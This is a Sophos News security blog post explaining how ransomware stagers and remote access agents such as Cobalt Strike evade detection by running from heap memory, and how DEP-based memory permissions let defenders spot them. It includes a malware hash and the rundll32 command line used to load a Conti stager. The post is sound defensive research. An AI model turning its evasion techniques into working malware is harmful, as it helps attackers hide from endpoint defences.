<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/" /><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>Covert code faces a Heap of trouble in memory &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Covert code faces a Heap of trouble in memory Comments Feed" href="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??/wp-includes/css/dist/block-library/style.min.css,/wp-content/themes/sophosnews-2017/style.css,/wp-content/mu-plugins/jetpack-9.5/css/jetpack.css?m=1616171106' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZoamxkaGpqUUWAK9KIh0='></script>
<link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/73028" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7" />
<link rel="canonical" href="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/" />
<link rel='shortlink' href='https://news.sophos.com/?p=73028' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2021%2F03%2F04%2Fcovert-code-faces-a-heap-of-trouble-in-memory%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2021%2F03%2F04%2Fcovert-code-faces-a-heap-of-trouble-in-memory%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style><link rel="amphtml" href="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Covert code faces a Heap of trouble in memory" />
<meta property="og:url" content="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/" />
<meta property="og:description" content="Fileless malware, ransomware and remote access agents trying to evade detection by running in memory rely on being able to allocate “Heap” memory – a step just made harder by Sophos" />
<meta property="article:published_time" content="2021-03-04T13:37:08+00:00" />
<meta property="article:modified_time" content="2021-03-04T13:37:08+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2021/03/Hooded-attacker.jpg?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2021/03/Hooded-attacker.jpg?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="335" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Covert code faces a Heap of trouble in memory" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2021/03/Hooded-attacker.jpg?w=640" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="fb:admins" content="28552295016" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-73028 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header">

		<div class="header-container">

			<div class="site-branding">
				<h1 class="site-title">
										<a class="site-logo" href="https://www.sophos.com/en-us.aspx" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- site-branding -->

			<nav class="primary-header-navigation" role="navigation">
				<ul id="menu-en-us-primary" class="menu"><li id="menu-item-33368" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33368"><a href="https://www.sophos.com/en-us/products.aspx">Products<div class="menu-item-description"></div></a></li>
<li id="menu-item-33382" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33382"><a href="https://www.sophos.com/en-us/solutions.aspx">Solutions<div class="menu-item-description"></div></a></li>
<li id="menu-item-33390" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33390"><a href="//www.sophos.com/en-us/partners.aspx">Partners<div class="menu-item-description"></div></a></li>
<li id="menu-item-33391" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33391"><a href="//www.sophos.com/en-us/support.aspx">Support<div class="menu-item-description"></div></a></li>
<li id="menu-item-33392" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33392"><a href="//www.sophos.com/en-us/company.aspx">Company<div class="menu-item-description"></div></a></li>
<li id="menu-item-33393" class="is-icon icon-download menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-33393"><a href="#">Downloads<div class="menu-item-description"></div></a>
<ul class="sub-menu">
	<li id="menu-item-33394" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33394"><a href="//www.sophos.com/en-us/products/free-trials.aspx">Free Trials<div class="menu-item-description">All product trials in one place.</div></a></li>
	<li id="menu-item-33395" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33395"><a href="//www.sophos.com/en-us/products/free-tools.aspx">Free Tools<div class="menu-item-description">Try our tools for use at home.</div></a></li>
	<li id="menu-item-33396" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33396"><a href="//www.sophos.com/en-us/products/request-a-quote.aspx">Get Pricing<div class="menu-item-description">The right price every time.</div></a></li>
</ul>
</li>
<li id="menu-item-33397" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33397"><a href="//www.sophos.com/en-us/search-results.aspx">Search<div class="menu-item-description"></div></a></li>
<li id="menu-item-33398" class="is-icon icon-account menu-item menu-item-type-custom menu-item-object-custom menu-item-33398"><a href="//www.sophos.com/en-us/login.aspx">Sign In<div class="menu-item-description"></div></a></li>
</ul>			</nav>

		</div>
	</header> <!-- site-header -->

	<div class="secondary-header">
		<div class="secondary-header-container container">
			<nav class="secondary-header-navigation" role="navigation">
				<ul id="menu-en-us-secondary" class="menu"><li id="menu-item-33399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33399"><a href="//www.sophos.com/en-us/company.aspx">Overview</a></li>
<li id="menu-item-33401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33401"><a href="//www.sophos.com/en-us/company/press.aspx">Press</a></li>
<li id="menu-item-33402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33402"><a href="//secure2.sophos.com/en-us/company/events.aspx">Events</a></li>
<li id="menu-item-33403" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33403"><a href="//www.sophos.com/en-us/company/community.aspx">Community</a></li>
<li id="menu-item-33404" class="menu-item-blog menu-item menu-item-type-custom menu-item-object-custom menu-item-33404"><a href="/">Blog</a></li>
<li id="menu-item-33405" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33405"><a href="//secure2.sophos.com/en-us/company/careers.aspx">Careers</a></li>
<li id="menu-item-33406" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33406"><a href="//www.sophos.com/en-us/company/contact.aspx">Contact</a></li>
</ul>			</nav>
		</div>
	</div> <!-- secondary-header -->

	<div class="news-header">
		<div class="news-header-container container">

			<div class="news-branding">
				<h1 class="news-title">
					<a class="news-logo" href="https://news.sophos.com/en-us/" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- news-branding -->

			<div class="mobile-menu-toggle">
				<a href="#newsmenu">
											Menu									</a>
			</div>

			<div class="mobile-search-toggle">
				<a class="icon icon-search-secondary" href="#search">
					Search				</a>
			</div>

			<nav class="news-header-navigation" role="navigation">
				<ul id="menu-en-us-tertiary" class="menu"><li id="menu-item-33407" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33407"><a href="#search">Search</a></li>
</ul>			</nav>

			<div class="site-search-block" style="display: none;">
				<form role="search" class="search-form" method="get" action="https://news.sophos.com/en-us/">
					<fieldset>
						<div class="field">
							<input type="text" value="" name="s" class="search-field" placeholder="Search">
						</div>
						<div class="submit">
							<button type="submit" class="search-submit icon icon-search-secondary">
								Go							</button>
						</div>
					</fieldset>
				</form>
				<a class="icon" href="#search-close">
					Close				</a>
			</div>
		</div>
	</div> <!-- news-header -->

	<div id="content" class="site-content">
		<div class="content-container">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-73028" class="post-73028 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-fileless-malware tag-ransomware tag-remote-access-agents region-en-us">

	<header class="entry-header">

		<h1 class="entry-title">Covert code faces a Heap of trouble in memory</h1>
		<div class="entry-categories">
			<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>&bull;<a href="https://news.sophos.com/en-us/tag/fileless-malware/">fileless malware</a>&bull;<a href="https://news.sophos.com/en-us/tag/ransomware/">Ransomware</a>&bull;<a href="https://news.sophos.com/en-us/tag/remote-access-agents/">remote access agents</a>		</div>

					<div class="entry-excerpt">
				<p>Fileless malware, ransomware and remote access agents trying to evade detection by running in memory rely on being able to allocate “Heap” memory – a step just made harder by Sophos</p>
			</div>
		
		<div class="entry-meta">
			<span class="posted-on"><a href="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/" rel="bookmark">4 March 2021</a></span>		</div><!-- .entry-meta -->

		<div class="entry-social">
			
	<ul class="social-sharing" id="social-sharing">
		<li class="comments">
			<a href="#comments" title="Leave a Reply">
				0			</a>
		</li>
		<li class="twitter"><a class="js-share-modal" href="http://twitter.com/intent/tweet?text=Covert%20code%20faces%20a%20Heap%20of%20trouble%20in%20memory%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D73028" data-title="" title="Share on Twitter">Share on Twitter</a></li>
		<li class="facebook"><a class="js-share-modal" href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=73028&#038;title=Covert%20code%20faces%20a%20Heap%20of%20trouble%20in%20memory" data-title="Covert code faces a Heap of trouble in memory" title="Share on Facebook">Share on Facebook</a></li>
		<li class="linkedin">
			<a
				href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/"
				data-title="Covert code faces a Heap of trouble in memory"
				title="Share on LinkedIn"
				onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
			>
				Share on LinkedIn			</a>
		</li>
	</ul>

			</div><!-- .entry-social -->
	</header><!-- .entry-header -->

		<div class="entry-featured-image">
		<img width="640" height="335" src="https://news.sophos.com/wp-content/uploads/2021/03/Hooded-attacker.jpg?w=640" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://news.sophos.com/wp-content/uploads/2021/03/Hooded-attacker.jpg 1200w, https://news.sophos.com/wp-content/uploads/2021/03/Hooded-attacker.jpg?resize=300,157 300w, https://news.sophos.com/wp-content/uploads/2021/03/Hooded-attacker.jpg?resize=768,402 768w, https://news.sophos.com/wp-content/uploads/2021/03/Hooded-attacker.jpg?resize=1024,536 1024w" sizes="(max-width: 640px) 100vw, 640px" />	</div> <!-- .featured-image -->
	
	<div class="entry-meta">
		<span class="byline">By <span class="author vcard"><a href="https://news.sophos.com/en-us/author/mark-loman/" title="Posts by Mark Loman" class="author url fn" rel="author">Mark Loman</a></span></span>	</div><!-- .entry-meta -->

	<div class="entry-content">
		<p>Of all classes of cybersecurity threat, ransomware is the one that people keep talking about. It can bring businesses to a halt and the ransom demands often range from hundreds of thousands to tens of millions of dollars.</p>
<p>These two factors alone mean that being hit by ransomware is a big deal, especially since most ransomware adversaries have now incorporated data theft into their attacks, giving targets an even bigger headache as they see their intellectual property leaked on the web.</p>
<p>For defenders, stopping these attacks is of paramount importance. Figuring out how the adversary was able to compromise the business in the first place is equally critical.</p>
<p>Since every organization has its own password policy, network topology and security configuration, ransomware attacks nowadays are often controlled by humans to ensure success. They leverage privileged accounts – often stolen – to execute commands as if they were physically at a keyboard in the office.</p>
<p>Before this can happen, however, adversaries deliver a flexible post-exploitation agent like Cobalt Strike or Meterpreter (a remote access agent or trojan). This agent facilitates most active adversary tactics, including execution, credential access, privilege escalation, discovery, lateral movement, collection, exfiltration, and impact (as charted in the <a href="https://attack.mitre.org/matrices/enterprise/windows/">MITRE ATT&amp;CK matrix</a>).</p>
<p>Many security products have a hard time reliably detecting these remote access agents, as they are highly configurable and deliberately packed, obfuscated or encrypted to evade network and endpoint defenses.</p>
<p>This is evidenced by the many high-impact incidents where such agents are used, including high-profile ransomware and nation-state attacks. For example, similar remote access agents were used in massive supply-chain attacks against targets such as SolarWinds, CCleaner, NetSarang (“ShadowPad”), and ASUS (“ShadowHammer”).</p>
<h2><span lang="EN-US">The Stager</span></h2>
<p>Initial access can occur in a variety of ways, from stolen credentials used to exploit a public-facing VPN or exposed RDP server, to the unintentional execution of malicious macros embedded in an Office document.</p>
<p>After initial access, the delivery of a remote access agent typically happens in stages. The first stage of an attack is often meant to determine if a valuable target has been reached and which agent to deliver depending on operating system architecture. This early malicious code – known as a “stager” or “loader” – is typically a handler or conduit that delivers the payload straight into memory, often evading deficient antivirus and machine learning examinations.</p>
<p>A stager typically contains little code so that it cannot be determined if it is there for a malicious purpose – it could also be benign.</p>
<p>Once the stager delivers the remote access trojan, that agent then delivers and executes additional payloads (like Mimikatz) straight into memory, preferably into or from a trusted Windows process or line-of-business application.</p>
<p>Think of it as a reusable multi-stage-to-orbit rocket, whereby the space rocket itself is not malicious in nature but the ultimate payload may be intended for malicious use.</p>
<h2><span lang="EN-US">Defense Evasion</span></h2>
<p>Despite advances in endpoint protection with cloud-delivered analysis, behavioral analysis and machine learning, adversaries are still able to evade detection by obfuscating or polymorphically rearranging their malicious code.</p>
<p>Prevalent trojans like Emotet, Trickbot and Qakbot are frequently re-obfuscated and packed to evade detection by network and antivirus defenses.</p>
<p>So, although defense evasion is not a new tactic, it results in attacks that deliberately distort detections intended to identify known threat families, as well as feature-based machine learning. It does this by using code structures and sequences that even well-trained models fail to predict.</p>
<p>The ultimate code is unknown and is often “allowed” (to prevent false positives), while the threat’s behavior – its purpose – remains the same. Shellter and Phantom Evasion are two tools that obfuscate well-known malicious code for defense evasion.</p>
<p>Fortunately, when a malware is loaded into memory it is unpacked or de-obfuscated. Once it is no longer <em>cloaked</em> by packing/obfuscation it becomes easier to detect. Unfortunately, even though endpoint defenses have the capability to scan memory, this is not often done due to the impact on performance.</p>
<p>Also, machine-learning models are typically not tailored towards memory scanning. This makes a memory scan dependent on the detection of sequences of known-bad code sequences (a “signature”). Code sequences can also be rearranged without any effect on function to evade detection. Skilled threat researchers can select a good code sequence that covers a range of obfuscated malware variants, but attackers will adapt.</p>
<p>Below (figure 1) is a stager detected by Sophos <a href="https://www.sophos.com/en-us/products/endpoint-antivirus.aspx?&amp;cmp=17464&amp;utm_campaign=GPD-2019-UKI-Google-PaidSearch-InterceptX-Brand-DG-17464&amp;utm_medium=cpc&amp;utm_content=B_InterceptX&amp;utm_term=sophos+intercept+x&amp;utm_source=google-search&amp;gclid=Cj0KCQiAyJOBBhDCARIsAJG2h5ezlbRsoV9XnwZ8UKsHTSh3OeFd5ZLk8p_gbmn2QxB84l6m06M_hg8aAhCnEALw_wcB">Intercept X</a> in a recent <a href="https://news.sophos.com/en-us/2021/02/16/conti-ransomware-evasive-by-nature/">Conti ransomware</a> attack:</p>
<figure id="attachment_73053" aria-describedby="caption-attachment-73053" style="width: 1578px" class="wp-caption aligncenter"><a href="https://news.sophos.com/wp-content/uploads/2021/03/Conti-backdoor-VT-no-detection-edit.png"><img loading="lazy" class="wp-image-73053 size-full" src="https://news.sophos.com/wp-content/uploads/2021/03/Conti-backdoor-VT-no-detection-edit.png" alt="" width="1578" height="421" srcset="https://news.sophos.com/wp-content/uploads/2021/03/Conti-backdoor-VT-no-detection-edit.png 1578w, https://news.sophos.com/wp-content/uploads/2021/03/Conti-backdoor-VT-no-detection-edit.png?resize=300,80 300w, https://news.sophos.com/wp-content/uploads/2021/03/Conti-backdoor-VT-no-detection-edit.png?resize=768,205 768w, https://news.sophos.com/wp-content/uploads/2021/03/Conti-backdoor-VT-no-detection-edit.png?resize=1024,273 1024w, https://news.sophos.com/wp-content/uploads/2021/03/Conti-backdoor-VT-no-detection-edit.png?resize=1536,410 1536w" sizes="(max-width: 1578px) 100vw, 1578px" /></a><figcaption id="caption-attachment-73053" class="wp-caption-text">Figure 1 – Stager malware used in a recent Conti ransomware attack</figcaption></figure>
<p>SHA-256: 66379f43359d10fa207ee3fe61696af3f0b465358341c91c167a75a942cac987<br />
Loaded as: rundll32 C:\ProgramData\x64.dll entryPoint</p>
<p>This offensive tactic has fueled a security industry trend to “record everything” with Endpoint Detection and Response (EDR). Using EDR, human threat responders (be it an in-house security operations team or an external service like Sophos’ 24/7 <a href="https://www.sophos.com/en-us/products/managed-threat-response.aspx?&amp;cmp=36261&amp;utm_campaign=GPD-2019-UKI-Google-PaidSearch-MTR-Brand-DG-36261&amp;utm_medium=cpc&amp;utm_content=B_MTR&amp;utm_term=%2Bsophos+%2Bmtr+%2Bservice&amp;utm_source=google-search&amp;gclid=Cj0KCQiAyJOBBhDCARIsAJG2h5cGZbU-l3uvY4u1fJrGdw_wyZH4BSQJcHqEvw72jlO8IJe_Mz4SYPkaAlw9EALw_wcB">Managed Threat Response</a>) can sift through the recordings and help detect such threats early, ideally before any ransomware is deployed. These services are also helpful in investigating a breach or incident.</p>
<h2><span lang="EN-US">Cobalt Strike Beacon</span></h2>
<p>A remote access agent that we frequently see delivered in protected networks is Cobalt Strike Beacon. Although originally intended for security assessments, the Cobalt Strike toolset has been leaked to cybercriminals. It is also used by nation-state attackers to keep costs low and frustrate attribution.</p>
<p>An example is the recently reported SolarWinds supply-chain incident (or “Solorigate”), where a Cobalt Strike Beacon deployed by attackers remained undetected for many months.</p>
<p>Cobalt Strike is also a popular go-to toolset for many human-operated ransomware attacks, including Conti – a ransomware family recently <a href="https://news.sophos.com/en-us/2021/02/16/conti-ransomware-attack-day-by-day/">reported</a> on <a href="https://news.sophos.com/en-us/2021/02/16/conti-ransomware-evasive-by-nature/">in depth</a> by Sophos researchers – thanks to its typical properties.</p>
<p>These include Cobalt Strike’s malleable command-and-control (C2) profile, configurable process injection and obfuscate-and-sleep features. This last feature is exactly what it sounds like: it obfuscates itself in memory while it waits for a command. When the agent wakes up it restores itself to its original state. This makes it difficult to spot in memory.</p>
<h2><span lang="EN-US">Modern Operating System Memory Permissions</span></h2>
<p>Fortunately, we have identified a static characteristic that is common across all these remote access agents. But before diving into this, it may help to explain memory permissions.</p>
<p>Since 2003, with AMD’s Athlon 64 and Intel’s Pentium 4 processors, central processing units (CPUs) in mainstream computers contain a technology called <a href="https://en.wikipedia.org/wiki/NX_bit">NX bit</a> (No-eXecute), that segregates regions of memory for either the storage of processor instructions (code), or the storage of data. With the Windows XP Service Pack 2 (SP2) in 2004, support for the NX technology – to segregate code and data – was introduced in Windows and is known as Data Execution Prevention (DEP).</p>
<p>For example, a memory region that contains an image shown in the web browser does not have code execution permissions, whereas the region that contains the core application – the web browser itself – can execute code.</p>
<p>Typically, the application itself, as well as its dynamic link libraries (DLLs), are loaded into a memory region called <strong>Image</strong>.</p>
<p>Applications need in-memory <em>workspace</em> to operate. This memory is dynamically allocated (and freed) to e.g., temporarily store or cache data like web pages with text, images, and scripts, so this data can be processed and displayed. For simplicity, we generally call this workspace the <strong>Heap</strong>, and it is largely represented as “Private Data.” The <strong>Heap</strong> grows (and shrinks) during the lifetime of the applications’ “process.”</p>
<p><strong>Image</strong> memory is normally protected with Execute/Read permissions. <strong>Heap</strong> memory with only data in it is typically allocated Read/Write permissions. When a <strong>Heap</strong> memory region is populated with code, permissions are set to Execute/Read/Write or Execute/Read.</p>
<p>Figures 2 through 4 below illustrate the memory layouts of NOTEPAD.EXE before and after compromise.</p>
<figure id="attachment_73055" aria-describedby="caption-attachment-73055" style="width: 1249px" class="wp-caption aligncenter"><a href="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-image-before.png"><img loading="lazy" class="wp-image-73055 size-full" src="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-image-before.png" alt="" width="1249" height="829" srcset="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-image-before.png 1249w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-image-before.png?resize=300,199 300w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-image-before.png?resize=768,510 768w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-image-before.png?resize=1024,680 1024w" sizes="(max-width: 1249px) 100vw, 1249px" /></a><figcaption id="caption-attachment-73055" class="wp-caption-text">Figure 2 &#8211; Typical Image memory layout of NOTEPAD.EXE</figcaption></figure>
<p>&nbsp;</p>
<figure id="attachment_73056" aria-describedby="caption-attachment-73056" style="width: 1249px" class="wp-caption aligncenter"><a href="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-before-edit.png"><img loading="lazy" class="wp-image-73056 size-full" src="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-before-edit.png" alt="" width="1249" height="340" srcset="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-before-edit.png 1249w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-before-edit.png?resize=300,82 300w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-before-edit.png?resize=768,209 768w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-before-edit.png?resize=1024,279 1024w" sizes="(max-width: 1249px) 100vw, 1249px" /></a><figcaption id="caption-attachment-73056" class="wp-caption-text">Figure 3 &#8211; Memory layout of NOTEPAD.EXE before compromise</figcaption></figure>
<figure id="attachment_73057" aria-describedby="caption-attachment-73057" style="width: 1249px" class="wp-caption aligncenter"><a href="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-after-edit.png"><img loading="lazy" class="wp-image-73057 size-full" src="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-after-edit.png" alt="" width="1249" height="340" srcset="https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-after-edit.png 1249w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-after-edit.png?resize=300,82 300w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-after-edit.png?resize=768,209 768w, https://news.sophos.com/wp-content/uploads/2021/03/notepad2-heap-after-edit.png?resize=1024,279 1024w" sizes="(max-width: 1249px) 100vw, 1249px" /></a><figcaption id="caption-attachment-73057" class="wp-caption-text">Figure 4 &#8211; Memory layout of NOTEPAD.EXE after compromise with Meterpreter</figcaption></figure>
<p>&nbsp;</p>
<p>Data Execution Prevention (DEP), or executable-space protection, is a system-level memory protection that ensures data-only regions cannot execute code. The purpose of DEP is to prevent arbitrary code execution when a buffer overflow is exploited, i.e., to prevent excess data (arbitrary code) past a buffer boundary from executing in a data-only memory region.</p>
<figure id="attachment_73058" aria-describedby="caption-attachment-73058" style="width: 1280px" class="wp-caption aligncenter"><a href="https://news.sophos.com/wp-content/uploads/2021/03/DEP-edit.png"><img loading="lazy" class="wp-image-73058 size-full" src="https://news.sophos.com/wp-content/uploads/2021/03/DEP-edit.png" alt="" width="1280" height="500" srcset="https://news.sophos.com/wp-content/uploads/2021/03/DEP-edit.png 1280w, https://news.sophos.com/wp-content/uploads/2021/03/DEP-edit.png?resize=300,117 300w, https://news.sophos.com/wp-content/uploads/2021/03/DEP-edit.png?resize=768,300 768w, https://news.sophos.com/wp-content/uploads/2021/03/DEP-edit.png?resize=1024,400 1024w" sizes="(max-width: 1280px) 100vw, 1280px" /></a><figcaption id="caption-attachment-73058" class="wp-caption-text">Figure 5 &#8211; Data Execution Prevention helps to prevent abuse of a buffer overflow</figcaption></figure>
<p>Because of DEP, every running application (“process”) that requires more memory, for instance to unpack code, must allocate or mark this additional memory region with code execution permissions before it can hand over code execution to this region. If this memory region does not have at least Execute/Read permissions, an exception is raised by the processor hardware and the process is terminated by the operating system.</p>
<p>This ordinary memory allocation is a fundamental and essential behavior that can also be observed in many covert attacks. Interestingly, especially in an attack scenario, the stager is typically (due to code injection or unpacking) running from <strong>Heap</strong> memory. And this stager allocates additional executable memory on the <strong>Heap</strong> for the ultimate agent. This &#8216;heap-heap&#8217; memory allocation behavior is a mainstay of the threat’s covert properties and abilities.</p>
